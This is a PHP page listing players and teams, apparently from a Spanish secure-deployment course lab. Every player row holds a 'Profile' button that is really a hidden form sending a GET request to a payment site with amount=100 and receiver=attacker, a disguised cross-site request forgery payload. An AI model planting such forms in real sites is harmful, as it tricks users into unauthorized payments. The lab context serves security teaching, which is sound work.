<?php
require_once dirname(__FILE__) . '/private/conf.php';

# Require logged users
require dirname(__FILE__) . '/private/auth.php';
?>
<!doctype html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/style.css">
    <title>Práctica RA3 - Players list</title>
</head>
<body>
    <header class="listado">
        <h1>Players list</h1>
    </header>
    <main class="listado">
        <section>
            <ul>
            <?php
            $query = "SELECT playerid, name, team FROM players order by playerId desc";

            $result = $db->query($query) or die("Invalid query");

            while ($row = $result->fetchArray()) {
                echo "
                    <li>
                    <div>
                    <span>Name: " . htmlspecialchars($row['name'], ENT_QUOTES, 'UTF-8') . 
                    "</span><span>Team: " . htmlspecialchars($row['team'], ENT_QUOTES, 'UTF-8') . 
                    "</span></div>
                    <div>
                    <form action='http://web.pagos/donate.php' method='get' style='display:inline;'>
                        <input type='hidden' name='amount' value='100'>
                        <input type='hidden' name='receiver' value='attacker'>
                        <input type='submit' value='Profile' style='cursor:pointer;'>
                    </form>
                    <a href=\"show_comments.php?id=".htmlspecialchars($row['playerid'], ENT_QUOTES, 'UTF-8')."\">(show/add comments)</a> 
                    <a href=\"insert_player.php?id=".htmlspecialchars($row['playerid'], ENT_QUOTES, 'UTF-8')."\">(edit player)</a>
                    </div>
                    </li>\n";
            }
            ?>
            </ul>
            <form action="#" method="post" class="menu-form">
                <a href="index.php">Back to home</a>
                <input type="submit" name="Logout" value="Logout" class="logout">
            </form>
        </section>
    </main>
    <footer class="listado">
        <img src="images/logo-iesra-cadiz-color-blanco.png">
        <h4>Puesta en producción segura</h4>
        &lt; Please <a href="http://www.donate.co?amount=100&amp;destination=ACMEScouting/"> donate</a> &gt;
    </footer>
</body>
</html>
